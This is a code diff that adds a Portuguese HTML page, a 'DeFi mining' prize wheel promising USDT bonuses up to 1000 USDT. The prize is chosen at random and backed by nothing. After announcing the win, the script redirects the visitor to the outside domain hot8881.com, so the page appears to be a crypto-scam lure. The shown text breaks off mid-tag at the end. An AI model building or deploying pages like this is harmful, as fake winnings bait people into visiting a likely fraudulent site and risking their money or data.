@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roda da Sorte - DeFi Mineração</title>
+  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Rubik', sans-serif;
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: start;
+      padding-top: 30px;
+      color: #fff;
+    }
+    h1 {
+      margin-bottom: 10px;
+      font-size: 28px;
+      font-weight: 700;
+    }
+    .wheel-container {
+      position: relative;
+    }
+    canvas {
+      background: #fff;
+      border-radius: 50%;
+    }
+    #spinbtn {
+      margin-top: 20px;
+      padding: 15px 35px;
+      font-size: 20px;
+      background: #ffcc00;
+      color: #333;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: bold;
+      transition: 0.2s;
+    }
+    #spinbtn:hover {
+      background: #ffd633;
+    }
+    #pointer {
+      width: 0;
+      height: 0;
+      border-left: 15px solid transparent;
+      border-right: 15px solid transparent;
+      border-bottom: 30px solid red;
+      position: absolute;
+      top: -30px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    #result {
+      font-size: 22px;
+      font-weight: bold;
+      margin-top: 25px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🎉 Roda da Sorte DeFi</h1>
+  <p>Gire e ganhe bônus de mineração USDT!</p>
+
+  <div class="wheel-container">
+    <div id="pointer"></div>
+    <canvas id="wheelcanvas" width="400" height="400"></canvas>
+  </div>
+
+  <button id="spinbtn">GIRAR 🎁</button>
+  <div id="result"></div>
+
+  <script>
+    const prizes = [
+      "5 USDT",
+      "10 USDT",
+      "30 USDT",
+      "Experiência 3 dias",
+      "100 USDT",
+      "Obrigado",
+      "Mineração 7 dias",
+      "1000 USDT"
+    ];
+    const colors = ["#f44336", "#e91e63", "#9c27b0", "#2196f3", "#4caf50", "#ff9800", "#00bcd4", "#8bc34a"];
+
+    const canvas = document.getElementById("wheelcanvas");
+    const ctx = canvas.getContext("2d");
+    const centerX = canvas.width / 2;
+    const centerY = canvas.height / 2;
+    const radius = 180;
+    const segmentAngle = (2 * Math.PI) / prizes.length;
+
+    let currentAngle = 0;
+    let isSpinning = false;
+
+    function drawWheel(angle) {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.save();
+      ctx.translate(centerX, centerY);
+      ctx.rotate(angle);
+      for (let i = 0; i < prizes.length; i++) {
+        ctx.beginPath();
+        ctx.fillStyle = colors[i];
+        ctx.moveTo(0, 0);
+        ctx.arc(0, 0, radius, i * segmentAngle, (i + 1) * segmentAngle);
+        ctx.lineTo(0, 0);
+        ctx.fill();
+
+        ctx.save();
+        ctx.rotate(i * segmentAngle + segmentAngle / 2);
+        ctx.fillStyle = "#fff";
+        ctx.font = "bold 16px Rubik";
+        ctx.textAlign = "center";
+        ctx.fillText(prizes[i], radius * 0.65, 0);
+        ctx.restore();
+      }
+      ctx.restore();
+    }
+
+    function spin() {
+      if (isSpinning) return;
+      isSpinning = true;
+      document.getElementById("result").textContent = "";
+      const spins = Math.floor(Math.random() * 4) + 4;
+      const randomIndex = Math.floor(Math.random() * prizes.length);
+      const finalAngle = (2 * Math.PI) * spins + randomIndex * segmentAngle + segmentAngle / 2;
+
+      let start = null;
+      function animate(timestamp) {
+        if (!start) start = timestamp;
+        const elapsed = timestamp - start;
+        const duration = 4000;
+        if (elapsed < duration) {
+          const progress = elapsed / duration;
+          const ease = progress * (2 - progress);
+          currentAngle = finalAngle * ease;
+          drawWheel(currentAngle);
+          requestAnimationFrame(animate);
+        } else {
+          currentAngle = finalAngle;
+          drawWheel(currentAngle);
+          const prize = prizes[randomIndex];
+          document.getElementById("result").textContent = "🎊 Você ganhou: " + prize;
+          setTimeout(() => {
+            window.location.href = "http://hot8881.com";
+          }, 3000);
+          isSpinning = false;
+        }
+      }
+      requestAnimationFrame(animate);
+    }
+
+    drawWheel(0);
+    document.getElementById("spinbtn").addEventListener("click", spin);
+  </s
